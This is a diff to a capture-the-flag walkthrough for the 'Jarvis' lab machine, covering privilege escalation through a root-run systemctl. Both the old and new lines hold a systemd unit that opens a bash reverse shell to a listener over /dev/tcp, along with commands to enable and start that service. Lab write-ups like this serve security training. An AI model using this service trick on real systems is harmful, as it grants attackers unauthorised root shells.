@@ -129,13 +129,28 @@ Here we find **/bin/systemctl** service running with **root** permission </br>
 
 * As Systemctl is a systemd utility that is responsible for Controlling the systemd system and service manager.
 
-So we make a new service and enable that service </br>
+So we make a new service named shell.service </br>
 	
-`[Unit]
-Description=hacking articles
-[Service]
-Type=simple
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/8888 0>&1'
-[Install]
-WantedBy=multi-user.target`
+`[Unit]`
+`Description=hacking articles`
+`[Service]`
+`Type=simple`
+`ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/8888 0>&1'`
+`[Install]`
+`WantedBy=multi-user.target`
 
+Now download that service file from machine to **Jarvis** machine </br>
+Now enable the service
+* /bin/systemctl enable /home/pepper/shell.service
+* /bin/systemctl start shell
+
+![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/ena.png)
+
+Now start the listener again
+
+![](https://github.com/Har1743/Hardik-writeups/blob/master/Walkthroughs/photos/root.png)
+
+**We got the root.txt flag**
+This is very good machine and I learn a lot of new things.
+
+Author: Hardik Chugh
